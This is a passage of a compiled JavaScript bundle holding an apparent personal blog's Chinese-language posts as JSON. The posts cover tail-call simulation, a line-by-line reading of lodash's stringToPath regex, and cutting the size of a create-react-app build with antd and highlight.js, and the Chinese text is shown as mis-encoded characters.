y</span>) </span>{\\n            <span class=\\"hljs-keyword\\">if</span> (y &gt; <span class=\\"hljs-number\\">0</span>) {\\n                <span class=\\"hljs-keyword\\">return</span> sum(x + <span class=\\"hljs-number\\">1</span>, y - <span class=\\"hljs-number\\">1</span>)\\n            } <span class=\\"hljs-keyword\\">else</span> {\\n                <span class=\\"hljs-keyword\\">return</span> x\\n            }\\n        });\\n\\n        <span class=\\"hljs-built_in\\">console</span>.log(sum(<span class=\\"hljs-number\\">1</span>, <span class=\\"hljs-number\\">3</span>))</code></pre></code></pre>\\n","toc":[],"relatedTags":null,"created_at":"2018-09-17","timeArr":[2018,8,17,0,0,0,0],"title":"ä¸€æ®µæ¨¡æ‹Ÿå°¾è°ƒç”¨çš„ä»£ç ","uuid":"486e17cd17cf6034e71874e022bd9b11474cb15f","summary":"<pre class=\\"hljs\\"><code><span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">tco</span>(<span class=\\"hljs-params\\">f</span>) </span>{\\n            <span class=\\"hljs-keyword\\">var</span> value;\\n            <span class=\\"hljs-keyword\\">var</span> active = <span class=\\"hljs-literal\\">false</span>;\\n            <span class=\\"hljs-keyword\\">var</span> accumulated = [];\\n            <span class=\\"hljs-keyword\\">return</span> <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">accumulator</span>(<span class=\\"hljs-params\\"></span>) </span>{\\n   ...</code></pre>","slug":"yi-duan-mo-ni-wei-diao-yong-de-dai-ma","sha":"d4ccfc9c818cb82435d9ad49679ef1c39a597b27"}')},655:function(n){n.exports=JSON.parse('{"content":"<h2 id=\\"yue-du-lodash-zhong-yi-duan-chang-zheng-ze-li-jie-bi-ji\\">é˜…è¯»lodashä¸­ä¸€æ®µé•¿æ­£åˆ™ç†è§£ç¬”è®°</h2>\\n<p>åœ¨lodashæºç <code>/.internal/stringToPath.js</code>ä¸­ï¼š</p>\\n<p>è¿™é‡Œè‹±æ–‡æ˜¯åŸæ³¨é‡Šï¼Œä¸­æ–‡æ˜¯ç®€å•çš„ç¿»è¯‘ä¸‹ï¼Œåé¢ä¼šè¯¦ç»†è§£é‡Šï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> rePropName = <span class=\\"hljs-built_in\\">RegExp</span>(\\n  <span class=\\"hljs-comment\\">// Match anything that isn\'t a dot or bracket.</span>\\n  <span class=\\"hljs-comment\\">// åŒ¹é…ä»»æ„ é.å’Œé[]çš„ä»»æ„å€¼(1ä¸ªä»¥ä¸Š)</span>\\n  <span class=\\"hljs-string\\">\'[^.[\\\\\\\\]]+\'</span> + <span class=\\"hljs-string\\">\'|\'</span> +\\n  <span class=\\"hljs-comment\\">// Or match property names within brackets.</span>\\n  <span class=\\"hljs-comment\\">// åŒ¹é… [</span>\\n  <span class=\\"hljs-string\\">\'\\\\\\\\[(?:\'</span> +\\n    <span class=\\"hljs-comment\\">// Match a non-string expression.</span>\\n    <span class=\\"hljs-comment\\">// åŒ¹é…(é\\" æˆ–è€… \')å’Œåé¢ä»»æ„æ•°é‡å€¼ï¼Œå³éå­—ç¬¦ä¸²</span>\\n    <span class=\\"hljs-string\\">\'([^\\"\\\\\'].*)\'</span> + <span class=\\"hljs-string\\">\'|\'</span> +\\n    <span class=\\"hljs-comment\\">// Or match strings (supports escaping characters).</span>\\n    <span class=\\"hljs-comment\\">// åŒ¹é…å­—ç¬¦ä¸²(æ”¯æŒè½¬ä¹‰å­—ç¬¦)</span>\\n    <span class=\\"hljs-string\\">\'([\\"\\\\\'])((?:(?!\\\\\\\\2)[^\\\\\\\\\\\\\\\\]|\\\\\\\\\\\\\\\\.)*?)\\\\\\\\2\'</span> +\\n  <span class=\\"hljs-string\\">\')\\\\\\\\]\'</span>+ <span class=\\"hljs-string\\">\'|\'</span> +\\n  <span class=\\"hljs-comment\\">// Or match \\"\\" as the space between consecutive dots or empty brackets.</span>\\n  <span class=\\"hljs-comment\\">// åŒ¹é…è¿ç»­çš„ç‚¹æˆ–è€…ä¸­æ‹¬å·ï¼Œç„¶ååŒ¹é…å€¼ä¸º\\"\\"</span>\\n  <span class=\\"hljs-string\\">\'(?=(?:\\\\\\\\.|\\\\\\\\[\\\\\\\\])(?:\\\\\\\\.|\\\\\\\\[\\\\\\\\]|$))\'</span>\\n, <span class=\\"hljs-string\\">\'g\'</span>)</code></pre></code></pre>\\n<h2 id=\\"li-jie\\">ç†è§£</h2>\\n<ul>\\n<li>ç¬¬ä¸€è¡Œ</li>\\n</ul>\\n<p><code>&#39;[^.[\\\\\\\\]]+&#39; + &#39;|&#39; +</code></p>\\n<p>ä¸€ä¸ªå…œåº•çš„åŒ¹é…ï¼Œæ„æ€æ˜¯åŒ¹é…é™¤äº†<code>.</code>å’Œ<code>[]</code>çš„ä»»æ„å€¼ï¼Œåé¢çš„å¦‚æœèƒ½åŒ¹é…åˆ™ä¼šè¦†ç›–è¿™ä¸ª(å› ä¸ºåé¢çš„åŒ¹é…å­—ç¬¦æ›´å¤š)ï¼›</p>\\n<p>ä¾‹å¦‚ï¼š</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-string\\">\'abc\'</span>.match(<span class=\\"hljs-regexp\\">/([^a]+|a(.)c)/</span>)\\n\\n<span class=\\"hljs-comment\\">// è¿™é‡Œä¸¤ä¸ªéƒ½èƒ½åŒ¹é…ï¼Œå‰é¢åŒ¹é…å€¼ä¸º\'bc\'ï¼Œåé¢çš„åŒ¹é…å€¼ä¸º\'abc\'ï¼Œå› æ­¤åé¢çš„ä¼˜å…ˆåŒ¹é…</span></code></pre></code></pre>\\n<p>è¿™é‡Œè¦æ³¨æ„çš„å°±æ˜¯åœ¨å­—ç¬¦ä¸²ä¸­è½¬ä¹‰éœ€è¦å†™ä¸¤æ¬¡<code>\\\\\\\\</code>ï¼Œè€Œä¸”è¿™é‡Œ<code>.</code>æ˜¯ä¸éœ€è¦è½¬ä¹‰ï¼Œåé¢é‚£ä¸ª<code>]</code>éœ€è¦è½¬ä¹‰å› ä¸ºæ„æˆäº†æ­§ä¹‰ã€‚</p>\\n<ul>\\n<li>ç¬¬äºŒè¡Œ</li>\\n</ul>\\n<p><code>&#39;\\\\\\\\[(?:&#39; +</code></p>\\n<p>è¿™é‡Œæœ‰ä¸€ä¸ª<code>?:</code>ï¼Œæ„æ€æ˜¯åœ¨è¿™ä¸ªæ‹¬å·å†…ï¼ŒåŒ¹é…å€¼ä½†ä¸éœ€è¦å‚¨å­˜åŒ¹é…ç»“æœ</p>\\n<ul>\\n<li>ç¬¬ä¸‰è¡Œ</li>\\n</ul>\\n<p><code>&#39;([^&quot;\\\\&#39;].*)&#39; + &#39;|&#39; +</code></p>\\n<p>æ²¡æœ‰ä»€ä¹ˆç‰¹åˆ«çš„...</p>\\n<ul>\\n<li>ç¬¬å››è¡Œ</li>\\n</ul>\\n<p><code>&#39;([&quot;\\\\&#39;])((?:(?!\\\\\\\\2)[^\\\\\\\\\\\\\\\\]|\\\\\\\\\\\\\\\\.)*?)\\\\\\\\2&#39; +</code></p>\\n<p>å…ˆçœ‹<code>([&quot;\\\\&#39;])</code></p>\\n<p>ä¹Ÿå°±æ˜¯åŒ¹é…åŒ|å•å¼•å·ï¼›</p>\\n<p>æ¥ç€åˆ†ä¸¤ç§åŒ¹é…ï¼š</p>\\n<h5 id=\\"4-1\\">4-1</h5>\\n<p><code>((?:(?!\\\\\\\\2)[^\\\\\\\\\\\\\\\\]</code></p>\\n<p>è¿™é‡Œé¦–å…ˆæ˜¯<code>?!</code>ï¼Œæ­£å‘å¦å®šé¢„æŸ¥ï¼Œæ„æ€æ˜¯åªæœ‰(åŒä¸€ä¸ªæ‹¬å·å†…)åé¢çš„ä¸æ»¡è¶³ï¼Œæ‰èƒ½å»åŒ¹é…å‰é¢çš„å€¼ï¼›</p>\\n<p>åé¢æ˜¯<code>\\\\\\\\2</code>ï¼Œè½¬ä¹‰åå°±æ˜¯<code>\\\\2</code>ï¼Œæ„æ€å°±æ˜¯åå‘å¼•ç”¨ç¬¬äºŒä¸ªæ‹¬å·å‚¨å­˜çš„ç»“æœï¼Œå°±æ˜¯<code>([&quot;\\\\&#39;])</code>ï¼›</p>\\n<p>å› æ­¤<code>(?!\\\\\\\\2)</code>è¿™é‡Œå°±æ˜¯åªè¦ä¸æ˜¯åŒ|å•å¼•å·ï¼Œå› ä¸ºç¬¬å››è¡Œæœ€åæœ‰<code>*</code>ï¼Œå› æ­¤è¿™é‡Œä¼šæŠ“å–ä»»æ„å¤šä¸ªä¸æ˜¯å¼•å·çš„å­—ç¬¦ï¼Œç„¶åå‚¨å­˜åˆ°æ‹¬å·åŒ¹é…å†…ï¼ˆåé¢ä½¿ç”¨æ—¶çš„<a href=\\"#%E5%8F%82%E6%95%B0%E5%90%AB%E4%B9%89\\">ç¬¬å››ä¸ªå‚æ•°</a>)ï¼‰ï¼›</p>\\n<p>èƒ½æŠ“å–åˆ°è¿™äº›å€¼åï¼Œå°±å»åŒ¹é…å‰é¢çš„å€¼ï¼Œå‰é¢çš„å€¼å°±æ˜¯<code>([&quot;\\\\&#39;])</code>ï¼Œè¿˜æ˜¯åŒ|å•å¼•å·ï¼Œå¦‚æœä¸èƒ½æŠ“å–è¿™äº›å€¼(ä¾‹å¦‚è¿ç»­å¤šä¸ªå¼•å·)ï¼Œåˆ™æ— æ³•åŒ¹é…ï¼›</p>\\n<p><code>\\\\\\\\\\\\\\\\</code>è½¬ä¹‰åå°±æ˜¯<code>\\\\\\\\</code>ï¼Œæ„æ€å°±æ˜¯åŒ¹é…ä¸€ä¸ªæ–œæ <code>\\\\</code>ï¼Œè¿™é‡Œå°±æ˜¯ä¸åŒ¹é…<code>\\\\</code>ï¼›</p>\\n<p>æ‰€ä»¥è¿™å¥çš„æ„æ€å°±æ˜¯ï¼šåŒ¹é…å•ä¸ªå¼•å·åé¢çš„éå¼•å·å€¼ï¼Œå¹¶ä¸”å®ƒåé¢ä¸èƒ½æ˜¯æ–œæ <code>\\\\</code></p>\\n<h5 id=\\"4-2\\">4-2</h5>\\n<p><code>|\\\\\\\\\\\\\\\\.</code></p>\\n<p>è½¬ä¹‰åå°±æ˜¯<code>\\\\\\\\.</code>ï¼Œæ„æ€å°±æ˜¯åŒ¹é…ä¸€ä¸ªæ–œæ <code>\\\\</code>åé¢å¯ä»¥æ˜¯ä»»æ„å€¼ï¼ˆ<em>å…¶å®å°±æ˜¯åŒ¹é…è½¬ä¹‰å­—ç¬¦</em>ï¼Œä¾‹å¦‚\\\\aï¼‰</p>\\n<p>æœ€å<code>*?)\\\\\\\\2</code></p>\\n<p>è¿™é‡Œç”¨äº†éè´ªå©ªæ¨¡å¼ï¼Œé‡è¯åé¢åŠ <code>?</code>ï¼Œå†æ­é…åé¢çš„<code>\\\\\\\\2</code>ï¼ˆå‰é¢è¯´äº†ï¼Œä¹Ÿå°±æ˜¯å¼•å·ï¼‰ã€‚</p>\\n<p>æ•´ä½“çš„æ„æ€å°±æ˜¯ï¼š<strong><em>å‰é¢2ç§åŒ¹é…(<a href=\\"#4-1\\">4-1</a>,<a href=\\"#4-2\\">4-2</a>)ï¼Œä»»ä½•ä¸€ç§åŒ¹é…åï¼ŒåŒ¹é…ä»»æ„ä½æ•°ï¼Œç›´åˆ°å‡ºç°ç¬¬ä¸€ä¸ªå¼•å·</em></strong>ã€‚</p>\\n<ul>\\n<li>ç¬¬äº”è¡Œ</li>\\n</ul>\\n<p><code>&#39;)\\\\\\\\]&#39;+ &#39;|&#39; +</code></p>\\n<p>è¿™é‡ŒåŒ¹é…äº†<code>]</code>ï¼Œå°±æ˜¯è¡¥å……äº†ç¬¬äºŒè¡ŒåŒ¹é…çš„<code>[</code>ï¼›å› æ­¤æˆ‘ä»¬çŸ¥é“ä»ç¬¬äºŒè¡Œåˆ°ç¬¬äº”è¡Œçš„åŒ¹é…ï¼Œéƒ½æ˜¯å¯¹åœ¨ä¸­æ‹¬å·<code>[]</code>å†…åŒ¹é…ç±»å‹çš„å¤„ç†ã€‚</p>\\n<ul>\\n<li>ç¬¬å…­è¡Œ</li>\\n</ul>\\n<p><code>&#39;(?=(?:\\\\\\\\.|\\\\\\\\[\\\\\\\\])(?:\\\\\\\\.|\\\\\\\\[\\\\\\\\]|$))&#39;</code></p>\\n<p><code>?=</code>æ˜¯æ­£å‘è‚¯å®šé¢„æŸ¥ï¼Œå³ç¬¦åé¢åŒ¹é…çš„ï¼Œå»åŒ¹é…å‰é¢çš„å€¼ï¼Œä½†å®ƒå‰é¢æ²¡æœ‰å€¼ï¼Œå°±ä¼šåŒ¹é…ä¸ºç©º<code>&quot;&quot;</code>ï¼›</p>\\n<p>å› æ­¤è¿™è¡Œå«ä¹‰å°±æ˜¯ï¼šå‡ºç°äº†<code>..</code>æˆ–è€…<code>[][]</code>æˆ–è€…å•ç‹¬çš„<code>.</code>å’Œå•ç‹¬çš„<code>[]</code>ä¼šè½¬æ¢æˆ<code>&quot;&quot;</code></p>\\n<ul>\\n<li>ç¬¬ä¸ƒè¡Œ</li>\\n</ul>\\n<p><code>, &#39;g&#39;)</code></p>\\n<p>å…¨å±€åŒ¹é…</p>\\n<h2 id=\\"shi-yong\\">ä½¿ç”¨</h2>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>string.replace(rePropName, (match, expression, quote, subString) =&gt; {\\n<span class=\\"hljs-keyword\\">let</span> key = match\\n<span class=\\"hljs-keyword\\">if</span> (quote) {\\n  <span class=\\"hljs-comment\\">// å°† \\\\\\\\ è½¬æ¢æˆ \\\\</span>\\n  key = subString.replace(reEscapeChar, <span class=\\"hljs-string\\">\'$1\'</span>)\\n}\\n<span class=\\"hljs-keyword\\">else</span> <span class=\\"hljs-keyword\\">if</span> (expression) {\\n  <span class=\\"hljs-comment\\">// å»ä¸¤ç«¯ç©ºæ ¼</span>\\n  key = expression.trim()\\n}\\nresult.push(key)\\n})</code></pre></code></pre>\\n<p>è¿™é‡Œ<code>replace</code>ç¬¬äºŒä¸ªå‚æ•°æ˜¯å‡½æ•°ï¼Œå› æ­¤å‡½æ•°çš„å‚æ•°æŒ‰ä»¥ä¸‹é¡ºåºæ’åˆ—ï¼š</p>\\n<ol>\\n<li><p>åŒ¹é…å€¼</p>\\n</li>\\n<li><p>åŒ¹é…è¿‡ç¨‹ä¸­æ‹¬å·å†…å‚¨å­˜(åŒ¹é…)çš„å€¼ï¼Œæœ‰å¤šä¸ªåˆ™å ç”¨å¤šä¸ªå‚æ•°ä½ç½®</p>\\n<p> ...</p>\\n</li>\\n<li><p>åŒ¹é…å€¼å¯¹åº”çš„ç´¢å¼•</p>\\n</li>\\n<li><p>è¾“å…¥çš„å­—ç¬¦ä¸²</p>\\n</li>\\n</ol>\\n<h5 id=\\"can-shu-han-yi\\">å‚æ•°å«ä¹‰</h5>\\n<p><code>match</code>æ˜¯æ•´ä¸ªè¡¨è¾¾å¼åŒ¹é…çš„å€¼</p>\\n<p><code>expression</code>åŒ¹é…<em>ä¸­æ‹¬å·å†…</em>éå­—ç¬¦ä¸² </p>\\n<p><code>quote</code>åŒ¹é…<em>ä¸­æ‹¬å·å†…</em>ç¬¬ä¸€ä¸ªå¼•å·(åé¢ä¸èƒ½ä¹Ÿæ˜¯å¼•å·ï¼Œå°±æ˜¯ä¸èƒ½é‡å¤) </p>\\n<p><code>subString</code>æ˜¯<em>ä¸­æ‹¬å·å†…</em>å…·ä½“å­—ç¬¦ä¸²çš„å€¼(æ— å¼•å·)</p>\\n<p>å› æ­¤ï¼š</p>\\n<p><code>if (quote)</code>è¯´æ˜ä¸­æ‹¬å·å†…æ˜¯å­—ç¬¦ä¸²ï¼Œæœ‰å¯èƒ½æœ‰è½¬ä¹‰ï¼Œè¦è¿›è¡Œå¤„ç†ã€‚</p>\\n<p><code>if (expression)</code>è¯´æ˜ä¸­æ‹¬å·å†…æ˜¯éå­—ç¬¦ä¸²ï¼Œæ˜¯å±æ€§å€¼ï¼Œéœ€è¦å»ç©ºæ ¼å¤„ç†ã€‚</p>\\n<h2 id=\\"zong-jie\\">æ€»ç»“</h2>\\n<p>é€šè¿‡è¿™ä¸ªæ­£åˆ™ï¼Œå­¦åˆ°äº†ï¼š</p>\\n<ol>\\n<li>æ­£åˆ™åŒ¹é…ä»¥åŒ¹é…å­—ç¬¦å¤šçš„ä¼˜å…ˆã€‚</li>\\n<li><code>\\\\1</code>, <code>\\\\2</code>, <code>?!</code>, <code>?=</code>, <code>?:</code>, åœ¨å­—ç¬¦ä¸²ä¸­<code>\\\\\\\\\\\\\\\\</code>çš„ä½¿ç”¨ã€‚</li>\\n<li>ä½¿ç”¨ <code>?!</code>ï¼Œé‡åˆ°é‡å¤å€¼ï¼Œå–æ¶ˆåé¢éƒ¨åˆ†åŒ¹é…(ä»è€Œå‡å°‘åŒ¹é…ä¼˜å…ˆæƒ)ã€‚<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code><span class=\\"hljs-comment\\">// è¿™é‡Œaè®¾å®šä¸èƒ½ä¸ºé‡å¤å€¼</span>\\n</code></pre></code></pre>\\n</li>\\n</ol>\\n<p>&quot;abc&quot;.match(/a((?!a).)<em>/)\\n// åŒ¹é…å€¼ï¼šabc\\n&quot;aabc&quot;.match(/a((?!a).)</em>/)\\n// åŒ¹é…å€¼ï¼ša</p>\\n<pre><code><pre class=\\"hljs\\"><code>4. ä½¿ç”¨`?=`ç½®ç©ºåŒ¹é…å€¼\\n```js\\n// åªè¦è¿ç»­å‡ºç°abcd åˆ™åŒ¹é…ä¸ºç©º\\n\\n\'abced\'.match(/(?=.*abcd.*)|.*/)\\n// åŒ¹é…å€¼ï¼šabced\\n\'eabcdd\'.match(/(?=.*abcd.*)|.*/)\\n// åŒ¹é…å€¼ï¼š\'\'</code></pre></code></pre><ol start=\\"5\\">\\n<li>replaceç¬¬äºŒå‚æ•°å‡½æ•°çš„ä½¿ç”¨ï¼Œæ‹¬å·çš„åŒ¹é…æœ‰å€¼ä¼šå¢åŠ å‡½æ•°å‚æ•°çš„æ•°é‡ã€‚</li>\\n</ol>\\n","toc":[{"anchor":"yue-du-lodash-zhong-yi-duan-chang-zheng-ze-li-jie-bi-ji","level":2,"text":"é˜…è¯»lodashä¸­ä¸€æ®µé•¿æ­£åˆ™ç†è§£ç¬”è®°"},{"anchor":"li-jie","level":2,"text":"ç†è§£"},{"anchor":"4-1","level":5,"text":"4-1"},{"anchor":"4-2","level":5,"text":"4-2"},{"anchor":"shi-yong","level":2,"text":"ä½¿ç”¨"},{"anchor":"can-shu-han-yi","level":5,"text":"å‚æ•°å«ä¹‰"},{"anchor":"zong-jie","level":2,"text":"æ€»ç»“"}],"relatedTags":null,"created_at":"2018-07-18","timeArr":[2018,6,18,0,0,0,0],"title":"ä¸€ä¸ªé•¿æ­£åˆ™çš„æ·±å…¥ç†è§£","uuid":"cdf39a26b776d98ab203524d376b062840672373","summary":"<h4>é˜…è¯»lodashä¸­ä¸€æ®µé•¿æ­£åˆ™ç†è§£ç¬”è®°</h4>\\n<p>åœ¨lodashæºç <code>/.internal/stringToPath.js</code>ä¸­ï¼š</p>\\n<p>è¿™é‡Œè‹±æ–‡æ˜¯åŸæ³¨é‡Šï¼Œä¸­æ–‡æ˜¯ç®€å•çš„ç¿»è¯‘ä¸‹ï¼Œåé¢ä¼šè¯¦ç»†è§£é‡Šï¼š</p>\\n<pre class=\\"hljs\\"><code><span class=\\"hljs-keyword\\">const</span> rePropName = <span class=\\"hljs-built_in\\">RegExp</span>(\\n  <span class=\\"hljs-comment\\">// Match anything that isn\'t a do...</span></code></pre>","slug":"yi-ge-chang-zheng-ze-de-shen-ru-li-jie","sha":"784356b84252e1f80acd38952d47176e1e4a8836"}')},656:function(n){n.exports=JSON.parse('{"content":"<p>è¿™æ˜¯ä¸€ä¸ªä¸ªäººåšå®¢ï¼ŒåŸºäº<code>antd</code>æ­å»ºï¼Œè¿™ä¸ªé¡¹ç›®æ„å»ºæµç¨‹å¦‚ä¸‹ï¼š</p>\\n<ol>\\n<li>å…ˆå¯åŠ¨<code>fetch-blog-serve</code>ï¼Œè¿™æ˜¯ä¸€ä¸ªèƒ½å°†ä½ çš„<code>repertory</code>çš„blogå†…å®¹æ‹‰å»åˆ°æœ¬åœ°ï¼Œå¹¶ä¸”å†™å…¥<code>xxx.json</code>ã€‚</li>\\n<li>åœ¨å†™å…¥ä¹‹å‰ä¼šç”Ÿæˆä¸€ä¸ªåˆ—è¡¨ï¼ŒåŒ…å«æ¯ä¸€ç¯‡blogçš„æ ‡é¢˜ã€æ—¥æœŸã€æ ‡ç­¾ã€æ‘˜è¦ã€shaå€¼(å”¯ä¸€æ€§åˆ¤æ–­)ã€‚</li>\\n<li>å‰ç«¯é€šè¿‡è·å–æ•°æ®ï¼Œå¯¹æ•°æ®è¿›è¡Œå¤„ç†ï¼Œåˆ†é…ç»™å„ä¸ªæ¿å—ã€‚</li>\\n<li>å…¶ä¸­æ¸²æŸ“<code>.MD</code>ä½¿ç”¨äº†<code>markdown-it</code>å’Œ<code>highlight.js</code>(<code>react-markdown</code>ä½¿ç”¨æ—¶å‡ºç°äº†ä¸€äº›æ ¼å¼åå·®ï¼Œå°±æ²¡æœ‰ç”¨äº†)ã€‚</li>\\n<li>UIç»„ä»¶éƒ½æ˜¯ä½¿ç”¨<code>antd</code>ã€‚</li>\\n</ol>\\n<p>æ„å»ºå¼€å§‹ï¼Œæˆ‘ä½¿ç”¨äº†<code>webpack-bundle-analyzer</code>æ¥æŸ¥çœ‹å„ä¸ªbundleçš„å¤§å°ã€‚</p>\\n<p>å› ä¸ºæ˜¯<code>create-react-app</code>æ„å»ºï¼Œéœ€è¦ä½¿ç”¨<code>react-app-rewire</code>ã€‚</p>\\n<p>ç¬¬ä¸€æ¬¡æ„å»ºï¼Œæ€»å¤§å°2.76M</p>\\n<p><img src=\\"/article/img/init.png\\" alt=\\"\\"></p>\\n<p>å¾ˆæ˜¾ç„¶æ˜¯ä¸è¡Œçš„ï¼Œä¸€ä¸ªä¸ªäººåšå®¢è€Œå·²...</p>\\n<p>å› ä¸ºæˆ‘ä»¬ä½¿ç”¨äº†<code>antd</code>,è€Œå½“è¿™ä¹ˆå†™<code>import {Button} from &#39;antd&#39;</code>çš„æ—¶å€™ï¼Œä¼šåŠ è½½æ‰€æœ‰ç»„ä»¶ï¼Œ</p>\\n<p>ä½¿ç”¨<code>babel-plugin-import</code>ä½œä¸ºwebpackæ’ä»¶ï¼ŒåŠ å…¥åˆ°<code>config-overrides.js</code>ä¸­ï¼Œè¿™é‡Œçš„configæŒ‡\\nwebpackçš„configé…ç½®ã€‚</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>config = injectBabelPlugin(\\n  [<span class=\\"hljs-string\\">\'import\'</span>, { <span class=\\"hljs-attr\\">libraryName</span>: <span class=\\"hljs-string\\">\'antd\'</span>, <span class=\\"hljs-attr\\">libraryDirectory</span>: <span class=\\"hljs-string\\">\'es\'</span>, <span class=\\"hljs-attr\\">style</span>: <span class=\\"hljs-string\\">\'css\'</span> }],\\n  config,\\n);</code></pre></code></pre>\\n<p>å…·ä½“è§<a href=\\"https://ant.design/docs/react/use-with-create-react-app-cn#%E9%AB%98%E7%BA%A7%E9%85%8D%E7%BD%AE\\">å®˜ç½‘</a></p>\\n<p>ç¬¬äºŒæ¬¡æ„å»ºï¼Œæ•ˆæœå¾ˆå¥½ï¼Œå‡å°‘äº†å°†è¿‘800Kï¼Œæ€»å¤§å°1.92M</p>\\n<p><img src=\\"/article/img/first.png\\" alt=\\"\\"></p>\\n<p>çœ‹äº†çœ‹æœ€å¤šçš„å°±æ˜¯<code>highlight.js</code>ï¼Œè¿™æ˜¯ä¸€ä¸ªé’ˆå¯¹ä»£ç è¯­è¨€è¿›è¡Œé«˜äº®ï¼Œç¾åŒ–çš„å·¥å…·ã€‚</p>\\n<blockquote>\\n<p>å½“é»˜è®¤åŠ è½½ <code>import hljs from &quot;highlight.js&quot;</code>çš„æ—¶å€™ï¼Œä¼šåŠ è½½æ‰€æœ‰è¯­è¨€çš„æ¸²æŸ“ç»„ä»¶ã€‚</p>\\n</blockquote>\\n<p>åº”è¯¥ä½¿ç”¨æŒ‰éœ€åŠ è½½(è¿™é‡ŒåªåŠ è½½jsçš„æ¸²æŸ“ç»„ä»¶)ï¼š</p>\\n<pre><code><pre class=\\"hljs\\"><code>import hljs from \'highlight.js/lib/highlight\';\\nimport javascript from \'highlight.js/lib/languages/javascript\';\\nhljs.registerLanguage(\'javascript\', javascript);</code></pre></code></pre><p>ç¬¬ä¸‰æ¬¡æ„å»ºï¼Œåˆå‡äº†800Kï¼Œæ€»å¤§å°1.12M</p>\\n<p><img src=\\"/article/img/second.png\\" alt=\\"\\"></p>\\n<p>å¾ˆæ˜æ˜¾ä¸€ä¸ªå¤§å¤§çš„<code>dist.js</code>åˆºæ¿€ç€æˆ‘çš„çœ¼ç›ã€‚</p>\\n<p>å¾€ä¸Šä¸€çœ‹ï¼ŒåŸæ¥æ˜¯<code>antd</code>çš„Iconç»„ä»¶ï¼Œè¿™æ˜¯æ€ä¹ˆå›äº‹ï¼Ÿä¸Šå®˜ç½‘ä¸€æŸ¥</p>\\n<blockquote>\\n<p>âš 3.9.0 ä¹‹åæˆ‘ä»¬å…¨é‡å¼•å…¥äº†æ‰€æœ‰å›¾æ ‡ï¼Œå¯¼è‡´ antd é»˜è®¤çš„åŒ…ä½“ç§¯æœ‰ä¸€å®šå¢åŠ ï¼Œæˆ‘ä»¬ä¼šåœ¨ä¸è¿œçš„æœªæ¥å¢åŠ æ–°çš„ API æ¥å®ç°å›¾æ ‡çš„æŒ‰éœ€ä½¿ç”¨ï¼Œæ›´å¤šç›¸å…³è®¨è®ºå¯å…³æ³¨ï¼š<a href=\\"https://github.com/ant-design/ant-design/issues/12011\\">#12011</a>ã€‚</p>\\n</blockquote>\\n<p>çœ‹äº†çœ‹è®¨è®ºçš„æƒ…å†µï¼Œç›®å‰æœ€å¥½çš„ä¸´æ—¶è§£å†³æ–¹æ¡ˆå°±æ˜¯ï¼Œé€šè¿‡webpackçš„<code>resolve.alias</code>ï¼Œè®©<code>antd</code>é‡Œçš„æ‰€æœ‰ç»„ä»¶çš„\\nå›¾æ ‡è·å–è½¬åˆ°ä¸€ä¸ªè‡ªå®šä¹‰æ–‡ä»¶ä¸­ï¼Œè¿™ä¸ªè‡ªå®šä¹‰æ–‡ä»¶å°†ä¼šæŒ‰éœ€å¯¼å‡ºã€‚</p>\\n<p>å…·ä½“çœ‹è¿™é‡Œ:<a href=\\"https://github.com/ant-design/ant-design/issues/12011#issuecomment-420038579\\">https://github.com/ant-design/ant-design/issues/12011#issuecomment-420038579</a></p>\\n<p>æ­å»ºå¥½è‡ªå®šä¹‰çš„<code>icons.js</code>åï¼Œè¿˜æ˜¯åœ¨<code>config-overrides.js</code>ä¸­ï¼Œ</p>\\n<pre><code class=\\"language-js\\"><pre class=\\"hljs\\"><code>config.resolve.alias[<span class=\\"hljs-string\\">\'@ant-design/icons/lib/dist$\'</span>]=path.resolve(__dirname, <span class=\\"hljs-string\\">\'./src/icons.js\'</span>)</code></pre></code></pre>\\n<p>ç¬¬å››æ¬¡æ„å»ºï¼Œå†æ¬¡å‡å°‘400Kåï¼Œæ€»å¤§å°ä¸º693Kï¼Œè¿™ä¸ªç»“æœæ˜¯å¯ä»¥æ¥å—çš„ã€‚</p>\\n<p><img src=\\"/article/img/final.png\\" alt=\\"\\"></p>\\n<p>è¿™å°±æ˜¯æˆ‘çš„ä¸€æ¬¡é¡¹ç›®æ„å»ºä½“ç§¯å‹ç¼©å…¨è¿‡ç¨‹ã€‚</p>\\n","toc":[],"relatedTags":null,"created_at":"2018-10-14","timeArr":[2018,9,14,0,0,0,0],"title":"ä¸€ä¸ªcreate-react-appé¡¹ç›®æ„å»ºä½“ç§¯çš„å‹ç¼©","uuid":"f410e8013460016ef21db0425ddcc6ef131809a0","summary":"<p>è¿™æ˜¯ä¸€ä¸ªä¸ªäººåšå®¢ï¼ŒåŸºäº<code>antd</code>æ­å»ºï¼Œè¿™ä¸ªé¡¹ç›®æ„å»ºæµç¨‹å¦‚ä¸‹ï¼š</p>\\n<ol>\\n<li>å…ˆå¯åŠ¨<code>fetch-blog-serve</code>ï¼Œè¿™æ˜¯ä¸€ä¸ªèƒ½å°†ä½ çš„<code>repertory</code>çš„blogå†…å®¹æ‹‰å»åˆ°æœ¬åœ°ï¼Œå¹¶ä¸”å†™å…¥<code>xxx.json</code>ã€‚</li>\\n<li>åœ¨å†™å…¥ä¹‹å‰ä¼šç”Ÿæˆä¸€ä¸ªåˆ—è¡¨ï¼ŒåŒ…å«æ¯ä¸€ç¯‡blogçš„æ ‡é¢˜ã€æ—¥æœŸã€æ ‡ç­¾ã€æ‘˜è¦ã€shaå€¼(å”¯ä¸€æ€§åˆ¤æ–­)ã€‚</li>\\n<li>å‰...</li>\\n</ol>","slug":"yi-ge-create-react-app-xiang-mu-gou-jian-ti-ji-de-ya-suo","sha":"e0bc2c78310a534ecec19f96adac09f5c5cb835a"}')},657:function(n){n.exports=JSON.parse('{"content":"<pre><code><pre class=\\"hljs\\"><code>init -&gt; v1 -&gt; v2 -&gt; v3 -- faulty merge -&gt; v4  (master)\\n           \\\\            /                     \\n            d1  --&gt;  d2                                   </code></pre></code></pre><p>ç°åœ¨åœ¨v4ï¼Œd2æœ‰bugï¼Œæƒ³å…ˆå–æ¶ˆåˆå¹¶</p>\\n<p>ä½¿ç”¨`git reset &quot;fault 